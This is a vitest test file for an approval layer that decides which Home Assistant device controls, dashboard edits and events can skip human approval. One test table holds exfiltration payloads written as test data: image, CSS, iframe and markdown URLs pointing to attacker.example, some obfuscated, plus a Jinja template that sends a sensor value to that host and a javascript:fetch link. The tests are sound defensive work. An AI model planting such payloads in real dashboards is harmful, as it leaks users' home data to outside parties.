import { describe, expect, it } from "vitest";
import { describeAction } from "../src/approvals";
import {
  autoApprovableKinds,
  CALL_SERVICE_KIND,
  CONTROL_DEVICES_KIND,
  EDIT_DASHBOARDS_KIND,
  FIRE_EVENT_KIND,
} from "../src/auto-approval";
import type { ActionOrigin, HATarget, HomeAssistantAction } from "../src/homeassistant";
import type { RegistrySnapshot } from "../src/homeassistant-api";

type Entity = {
  entity_id: string;
  platform?: string;
  device_id?: string;
  area_id?: string;
  labels?: string[];
  entity_category?: string | null;
  hidden_by?: string | null;
  device_class?: string | null;
  original_device_class?: string | null;
};

// A small home: a living room on the ground floor with a lamp device (light plus a config
// switch), a garage with a garage door, and a bedroom whose lights carry a label.
function registry(extra: { entities?: Entity[]; states?: [string, any][] } = {}): RegistrySnapshot {
  const entities: Entity[] = [
    { entity_id: "light.lamp", device_id: "lamp" },
    { entity_id: "switch.lamp_child_lock", device_id: "lamp", entity_category: "config" },
    { entity_id: "switch.plug", area_id: "living_room" },
    { entity_id: "switch.camera_motion", entity_category: "config" },
    { entity_id: "light.bedroom", area_id: "bedroom", labels: ["cozy"] },
    { entity_id: "light.hidden", area_id: "living_room", hidden_by: "user" },
    { entity_id: "cover.blind", area_id: "living_room" },
    { entity_id: "cover.garage_door", area_id: "garage" },
    { entity_id: "cover.unclassified" },
    { entity_id: "cover.overridden", device_class: "garage" },
    { entity_id: "lock.front_door" },
    { entity_id: "fan.ceiling" },
    { entity_id: "climate.hall" },
    { entity_id: "media_player.speaker" },
    { entity_id: "vacuum.robot" },
    { entity_id: "humidifier.bedroom" },
    { entity_id: "scene.evening" },
    ...(extra.entities ?? []),
  ];
  const states = new Map<string, any>([
    ["cover.blind", { attributes: { device_class: "blind" } }],
    ["cover.garage_door", { attributes: { device_class: "garage" } }],
    ["cover.overridden", { attributes: { device_class: "blind" } }],
    ["scene.evening", { attributes: { entity_id: ["light.lamp", "cover.blind"] } }],
    ...(extra.states ?? []),
  ]);
  return {
    floors: [{ floor_id: "ground" }],
    areas: [
      { area_id: "living_room", floor_id: "ground" },
      { area_id: "garage" },
      { area_id: "bedroom" },
      { area_id: "empty" },
    ],
    labels: [{ label_id: "cozy" }],
    devices: [{ id: "lamp", area_id: "living_room" }],
    // Every fixture entity comes from a device integration unless it names its own platform.
    entities: entities.map(entity => ({ platform: "demo", ...entity })),
    states,
  };
}

const emptyRegistry: RegistrySnapshot = {
  areas: [], floors: [], labels: [], devices: [], entities: [], states: new Map(),
};

function call(
  domain: string,
  service: string,
  opts: { target?: HATarget; data?: Record<string, unknown>; origin?: ActionOrigin } = {},
): HomeAssistantAction {
  return {
    id: 1,
    type: "callService",
    domain,
    service,
    data: opts.data,
    target: opts.target,
    origin: opts.origin ?? { kind: "session" },
  };
}

function entityCall(entityId: string, service: string, data?: Record<string, unknown>) {
  return call(entityId.split(".")[0], service, {
    target: { entity_id: entityId },
    data,
    origin: { kind: "entity", entityId },
  });
}

function verdict(action: HomeAssistantAction, reg: RegistrySnapshot = registry()) {
  const { actionKind, autoApprovable } = describeAction(action, reg);
  return { tag: actionKind?.tag, autoApprovable };
}

const deviceControl = { tag: CONTROL_DEVICES_KIND.tag, autoApprovable: true };
const callService = { tag: CALL_SERVICE_KIND.tag, autoApprovable: false };

describe("action kinds", () => {
  it("reports exactly the kinds that can be auto-approved on the whole instance", () => {
    expect(autoApprovableKinds("instance").map((k) => k.tag)).toEqual(["control-devices", "edit-dashboards"]);
  });

  it.each([
    ["area", "living_room"],
    ["label", "cozy"],
    ["device", "lamp"],
    ["entity", "light.lamp"],
    ["entity", "cover.blind"],
  ] as const)("leaves out dashboards on a %s binding, which cannot reach one", (resourceKind, resourceId) => {
    expect(autoApprovableKinds(resourceKind, resourceId).map((k) => k.tag)).toEqual(["control-devices"]);
  });

  it.each(["lock.front_door", "alarm_control_panel.home", "script.unlock", "scene.movie", "notify.phone"])(
    "offers nothing on a binding to %s, whose domain has no device-control service",
    (entityId) => {
      expect(autoApprovableKinds("entity", entityId)).toEqual([]);
    },
  );

  it("gives every kind its own tag and label", () => {
    const kinds = [CONTROL_DEVICES_KIND, CALL_SERVICE_KIND, FIRE_EVENT_KIND, EDIT_DASHBOARDS_KIND];
    expect(new Set(kinds.map((k) => k.tag)).size).toBe(kinds.length);
    expect(new Set(kinds.map((k) => k.label)).size).toBe(kinds.length);
  });
});

function saveDashboard(config: unknown): HomeAssistantAction {
  return { id: 1, type: "saveDashboard", urlPath: null, config, origin: { kind: "dashboard", urlPath: "lovelace" } };
}

function nestedViews(depth: number): unknown {
  let config: unknown = { type: "entities", entities: ["light.lamp"] };
  for (let i = 0; i < depth; i++) config = { type: "vertical-stack", cards: [config] };
  return { views: [{ cards: [config] }] };
}

describe("saveDashboard and fireEvent", () => {
  it("auto-approves a dashboard edit", () => {
    expect(verdict(saveDashboard({ views: [] }))).toEqual({ tag: "edit-dashboards", autoApprovable: true });
  });

  it("auto-approves cards, images and links that stay on the Home Assistant origin", () => {
    const config = {
      title: "Home & garden",
      views: [{
        path: "main",
        background: "center / cover no-repeat url('/local/background.png')",
        cards: [
          { type: "entities", entities: ["light.lamp", { entity: "switch.plug", name: "Plug", icon: "mdi:power-socket" }] },
          { type: "picture", image: "/local/floorplan.png", tap_action: { action: "navigate", navigation_path: "/lovelace/1" } },
          { type: "markdown", content: "# Welcome\n![plan](/local/plan.png) Lights: on, at 18:30" },
          { type: "iframe", url: "/local/status.html" },
        ],
      }],
    };
    expect(verdict(saveDashboard(config))).toEqual({ tag: "edit-dashboards", autoApprovable: true });
  });

  it.each([
    ["an absolute image URL", { type: "picture", image: "https://attacker.example/pixel.png?s=abc" }],
    ["a scheme-relative image URL", { type: "picture", image: "//attacker.example/pixel.png" }],
    ["a slashless http image URL", { type: "picture", image: "http:attacker.example/pixel.png?s=abc" }],
    ["a slashless https image URL", { type: "picture", image: "HTTPS:attacker.example/pixel.png" }],
    ["a slashless URL in markdown", { type: "markdown", content: "![x](https:attacker.example/x.png)" }],
    ["a slashless CSS URL", { type: "entities", entities: [], card_mod: { style: "ha-card { background: url(http:attacker.example/x) }" } }],
    ["a backslash URL", { type: "picture", image: "/\\attacker.example/pixel.png" }],
    ["a URL split by a tab", { type: "picture", image: "/\t/attacker.example/pixel.png" }],
    ["an iframe URL", { type: "iframe", url: "https://attacker.example/" }],
    ["a CSS background URL", { type: "entities", entities: [], card_mod: { style: "ha-card { background: url(https://attacker.example/x) }" } }],
    ["a CSS-escaped URL", { type: "entities", entities: [], card_mod: { style: "ha-card { background: url(\\2f\\2f attacker.example/x) }" } }],
    ["a markdown image", { type: "markdown", content: "![x](https://attacker.example/x.png)" }],
    ["an HTML-entity URL in markdown", { type: "markdown", content: '<img src="&#47;&#47;attacker.example/x">' }],
    ["a named HTML entity in markdown", { type: "markdown", content: "![x](&sol;&sol;attacker.example/x)" }],
    ["a Jinja template", { type: "markdown", content: "![x]({{ '/' ~ '/attacker.example/' ~ states('sensor.code') }})" }],
    ["a Jinja statement", { type: "markdown", content: "{% for s in states %}{{ s }}{% endfor %}" }],
    ["a JavaScript template", { type: "entities", entities: [], name: "[[[ return 1 ]]]" }],
    ["a javascript: link", { type: "button", tap_action: { action: "url", url_path: "javascript:fetch('/x')" } }],
    ["a custom card", { type: "custom:button-card", entity: "light.lamp" }],
    ["a URL in a key", { type: "entities", entities: [], "https://attacker.example/": true }],
  ])("asks before saving a dashboard with %s", (_name, card) => {
    expect(verdict(saveDashboard({ views: [{ cards: [card] }] }))).toEqual({
      tag: "edit-dashboards",
      autoApprovable: false,
    });
  });

  it("asks before saving a dashboard driven by a custom strategy", () => {
    const config = { strategy: { type: "custom:remote-strategy" } };
    expect(verdict(saveDashboard(config))).toEqual({ tag: "edit-dashboards", autoApprovable: false });
  });

  it("asks before saving a configuration nested too deeply to check", () => {
    expect(verdict(saveDashboard(nestedViews(10))).autoApprovable).toBe(true);
    expect(verdict(saveDashboard(nestedViews(100))).autoApprovable).toBe(false);
  });

  it("never auto-approves an event", () => {
    const action: HomeAssistantAction = {
      id: 1,
      type: "fireEvent",
      eventType: "doorbell_pressed",
      origin: { kind: "session" },
    };
    expect(verdict(action)).toEqual({ tag: "fire-event", autoApprovable: false });
  });

  it("never auto-approves a malformed service call", () => {
    const action = { ...call("light", "turn_on"), domain: { domain: "light" } } as never;
    expect(describeAction(action, registry())).toMatchObject({
      title: "Invalid service call",
      actionKind: CALL_SERVICE_KIND,
      autoApprovable: false,
    });
  });
});

describe("callService allowlist", () => {
  it.each([
    ["light.lamp", "turn_on"],
    ["light.lamp", "toggle"],
    ["switch.plug", "turn_off"],
    ["fan.ceiling", "set_percentage"],
    ["climate.hall", "set_temperature"],
    ["climate.hall", "set_hvac_mode"],
    ["media_player.speaker", "media_pause"],
    ["media_player.speaker", "volume_set"],
    ["vacuum.robot", "return_to_base"],
    ["humidifier.bedroom", "set_humidity"],
    ["cover.blind", "open_cover"],
    ["cover.blind", "set_cover_position"],
  ])("auto-approves %s %s", (entityId, service) => {
    expect(verdict(entityCall(entityId, service))).toEqual(deviceControl);
  });

  it.each([
    ["lock", "lock", "lock.front_door"],
    ["lock", "unlock", "lock.front_door"],
    ["lock", "open", "lock.front_door"],
    ["alarm_control_panel", "alarm_disarm", "alarm_control_panel.home"],
    ["alarm_control_panel", "alarm_arm_away", "alarm_control_panel.home"],
    ["notify", "send_message", "notify.phone"],
    ["tts", "speak", "tts.cloud"],
    ["script", "turn_on", "script.morning"],
    ["automation", "turn_off", "automation.lights"],
    ["automation", "trigger", "automation.lights"],
    ["homeassistant", "turn_on", "light.lamp"],
    ["homeassistant", "restart", "light.lamp"],
    ["input_boolean", "turn_on", "input_boolean.vacation"],
    ["input_number", "set_value", "input_number.setpoint"],
    ["number", "set_value", "number.lamp_timer"],
    ["select", "select_option", "select.lamp_mode"],
    ["button", "press", "button.reboot"],
    ["media_player", "play_media", "media_player.speaker"],
    ["media_player", "media_seek", "media_player.speaker"],
    ["valve", "open_valve", "valve.water_main"],
    ["siren", "turn_on", "siren.hall"],
    ["remote", "send_command", "remote.tv"],
    ["light", "flash", "light.lamp"],
  ])("never auto-approves %s.%s", (domain, service, entityId) => {
    expect(verdict(call(domain, service, { target: { entity_id: entityId } }))).toEqual(callService);
  });
});

describe("callService targets", () => {
  it("is false when the registry could not be read", () => {
    expect(verdict(entityCall("light.lamp", "turn_on"), emptyRegistry)).toEqual(callService);
  });

  it("is false for an entity the registry does not know", () => {
    expect(verdict(entityCall("light.yaml_only", "turn_on"))).toEqual(callService);
  });

  it("is false with no target at all", () => {
    expect(verdict(call("light", "turn_on"))).toEqual(callService);
  });

  it("is false for the all and none keywords, in target or data", () => {
    expect(verdict(call("light", "turn_off", { target: { entity_id: "all" } }))).toEqual(callService);
    expect(verdict(call("cover", "open_cover", { data: { entity_id: "all" } }))).toEqual(callService);
    expect(verdict(call("light", "turn_off", { target: { area_id: "none" } }))).toEqual(callService);
  });

  it("is false for an explicit entity in another domain", () => {
    expect(verdict(call("light", "turn_on", { target: { entity_id: ["light.lamp", "lock.front_door"] } })))
      .toEqual(callService);
  });

  it("is false for an explicitly targeted config entity", () => {
    expect(verdict(entityCall("switch.camera_motion", "turn_off"))).toEqual(callService);
  });

  it("is false for an entity whose integration runs configured actions", () => {
    for (const platform of ["template", "command_line", "rest", "group", "universal", "switch_as_x"]) {
      const scripted = registry({ entities: [{ entity_id: "switch.scripted", platform }] });
      expect(verdict(entityCall("switch.scripted", "turn_on"), scripted), platform).toEqual(callService);
    }
    const unknown = registry({ entities: [{ entity_id: "switch.unknown", platform: undefined }] });
    expect(verdict(entityCall("switch.unknown", "turn_on"), unknown)).toEqual(callService);
    const plain = registry({ entities: [{ entity_id: "switch.hue_plug", platform: "hue" }] });
    expect(verdict(entityCall("switch.hue_plug", "turn_on"), plain)).toEqual(deviceControl);
  });

  it("is false for a script-backed entity reached through its area", () => {
    const scripted = registry({ entities: [{ entity_id: "switch.lobby", area_id: "empty", platform: "template" }] });
    expect(verdict(call("switch", "turn_on", { target: { area_id: "empty" } }), scripted)).toEqual(callService);
  });

  it("accepts target keys in data from the whole-instance session", () => {
    expect(verdict(call("light", "turn_on", { data: { entity_id: "light.lamp", brightness: 200 } })))
      .toEqual(deviceControl);
  });

  it("reads target keys in data, not only target", () => {
    expect(verdict(call("light", "turn_on", {
      target: { entity_id: "light.lamp" },
      data: { entity_id: "light.yaml_only" },
    }))).toEqual(callService);
    expect(verdict(call("cover", "open_cover", {
      target: { entity_id: "cover.blind" },
      data: { entity_id: "cover.garage_door" },
    }))).toEqual(callService);
  });

  it("is false when a scoped capability passes target keys in data", () => {
    expect(verdict(entityCall("light.lamp", "turn_off", { area_id: "living_room" }))).toEqual(callService);
    expect(verdict(call("light", "turn_off", {
      target: { device_id: "lamp" },
      data: { entity_id: "light.bedroom" },
      origin: { kind: "device", deviceId: "lamp" },
    }))).toEqual(callService);
  });

  it("expands device, area, label and floor targets the way Home Assistant does", () => {
    // The lamp device's only switch is a config entity, which HA skips for device targets, so
    // the switch call reaches nothing.
    expect(verdict(call("switch", "turn_off", {
      target: { device_id: "lamp" },
      origin: { kind: "device", deviceId: "lamp" },
    }))).toEqual(callService);
    expect(verdict(call("light", "turn_off", {
      target: { device_id: "lamp" },
      origin: { kind: "device", deviceId: "lamp" },
    }))).toEqual(deviceControl);
    expect(verdict(call("switch", "turn_off", {
      target: { area_id: "living_room" },
      origin: { kind: "area", areaId: "living_room" },
    }))).toEqual(deviceControl);
    expect(verdict(call("light", "turn_on", {
      target: { label_id: "cozy" },
      origin: { kind: "label", labelId: "cozy" },
    }))).toEqual(deviceControl);
    expect(verdict(call("light", "turn_on", { target: { floor_id: "ground" } }))).toEqual(deviceControl);
  });

  it("skips config entities only for expanded targets", () => {
    const reg = registry({ entities: [{ entity_id: "switch.lamp_power", device_id: "lamp" }] });
    expect(verdict(call("switch", "turn_off", { target: { device_id: "lamp" } }), reg)).toEqual(deviceControl);
    expect(verdict(call("switch", "turn_off", {
      target: { entity_id: "switch.lamp_child_lock" },
    }), reg)).toEqual(callService);
  });

  it("checks config entities that carry a label directly, which HA reaches through the label", () => {
    const labelCall = call("switch", "turn_off", {
      target: { label_id: "cozy" },
      origin: { kind: "label", labelId: "cozy" },
    });
    const plug = { entity_id: "switch.cozy_plug", labels: ["cozy"] };
    expect(verdict(labelCall, registry({ entities: [plug] }))).toEqual(deviceControl);
    expect(verdict(labelCall, registry({
      entities: [plug, { entity_id: "switch.cozy_camera_motion", labels: ["cozy"], entity_category: "config" }],
    }))).toEqual(callService);
    // HA's label expansion still skips hidden entities, so a hidden one does not count.
    expect(verdict(labelCall, registry({
      entities: [plug, { entity_id: "switch.cozy_hidden", labels: ["cozy"], hidden_by: "user", entity_category: "config" }],
    }))).toEqual(deviceControl);
  });

  it("expands a label through the devices and areas carrying it", () => {
    // "tagged" is on no entity, so only device and area expansion reach anything.
    const labelCall = (domain: string) => call(domain, "turn_on", { target: { label_id: "tagged" } });
    const reg = registry();
    reg.labels.push({ label_id: "tagged" });
    expect(verdict(labelCall("light"), reg)).toEqual(callService);
    reg.devices[0].labels = ["tagged"];
    expect(verdict(labelCall("light"), reg)).toEqual(deviceControl);
    reg.devices[0].labels = [];
    reg.areas.find((a: any) => a.area_id === "bedroom").labels = ["tagged"];
    expect(verdict(labelCall("light"), reg)).toEqual(deviceControl);
  });

  it("is false for an area, device, label or floor the registry does not know", () => {
    // Each unknown id rides along with a safe entity, so only the existence check makes it false.
    expect(verdict(call("light", "turn_on", { target: { entity_id: "light.lamp" } }))).toEqual(deviceControl);
    for (const unknown of [
      { area_id: "attic" },
      { device_id: "ghost" },
      { label_id: "ghost" },
      { floor_id: "roof" },
    ]) {
      expect(verdict(call("light", "turn_on", { target: { entity_id: "light.lamp", ...unknown } })))
        .toEqual(callService);
    }
  });

  it("is false when the target reaches no entity of the domain", () => {
    expect(verdict(call("light", "turn_on", {
      target: { area_id: "empty" },
      origin: { kind: "area", areaId: "empty" },
    }))).toEqual(callService);
  });
});

describe("covers", () => {
  it.each(["garage", "gate", "door", "window"])("is false for a %s cover, whatever the service", (cls) => {
    const reg = registry({
      entities: [{ entity_id: "cover.entry" }],
      states: [["cover.entry", { attributes: { device_class: cls } }]],
    });
    for (const service of ["open_cover", "close_cover", "stop_cover", "set_cover_position"]) {
      expect(verdict(entityCall("cover.entry", service), reg)).toEqual(callService);
    }
  });

  it("is false for a cover whose class is unknown", () => {
    expect(verdict(entityCall("cover.unclassified", "open_cover"))).toEqual(callService);
  });

  it("is false when the registry gives an unsafe class the state does not", () => {
    expect(verdict(entityCall("cover.overridden", "open_cover"))).toEqual(callService);
  });

  it("is false for a cover reached through an area, even a safe one", () => {
    // HA re-resolves the area when the call runs, so a garage door added meanwhile would open.
    expect(verdict(call("cover", "close_cover", {
      target: { area_id: "living_room" },
      origin: { kind: "area", areaId: "living_room" },
    }))).toEqual(callService);
  });
});

describe("scenes", () => {
  it("is false even when every member of the scene is safe", () => {
    // HA runs the scene as defined when the call applies, and its members can change meanwhile.
    expect(verdict(entityCall("scene.evening", "turn_on"))).toEqual(callService);
  });

  it("is false for scene.apply, which sets arbitrary states", () => {
    expect(verdict(call("scene", "apply", { data: { entities: { "lock.front_door": "unlocked" } } })))
      .toEqual(callService);
  });
});

